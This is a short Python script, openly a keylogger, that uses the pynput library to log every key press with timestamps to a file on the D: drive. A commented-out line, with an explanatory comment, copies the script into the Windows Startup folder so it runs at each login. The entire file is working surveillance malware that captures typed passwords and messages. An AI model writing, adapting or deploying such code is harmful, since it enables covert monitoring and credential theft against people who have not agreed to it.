from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username=os.getlogin()
logging_directory=f"D:/Books/logs/"
#copyfile('keylogger.py',f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/keylogger.py')
#copyfile is used to make keylogger start at startup
logging.basicConfig(filename=f"{logging_directory}/logs.txt",level=logging.DEBUG,format="%(asctime)s:%(message)s")

def key_handler(key):
         logging.info(key)

with Listener(on_press=key_handler) as listener:
         listener.join()
